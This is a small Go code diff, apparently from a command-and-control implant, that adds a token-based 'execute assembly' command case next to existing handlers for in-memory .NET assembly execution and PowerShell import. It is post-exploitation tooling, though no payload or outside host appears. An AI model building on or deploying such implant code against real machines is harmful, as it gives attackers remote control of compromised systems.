@@ -140,6 +140,9 @@ func main() {
 							case packet.CMD_TYPE_EXECUTE_ASSEMBLY_X64:
 								result, err = services.CmdExecuteAssemblyX64(cmdBuf)
 								callbackType = 0
+							case packet.CMD_TYPE_EXECUTE_ASSEMBLY_TOKEN_X64:
+								result, err = services.CmdExecuteAssemblyX64(cmdBuf)
+								callbackType = 0
 							case packet.CMD_TYPE_IMPORT_POWERSHELL:
 								result, err = services.CmdImportPowershell(cmdBuf)
 								callbackType = 0
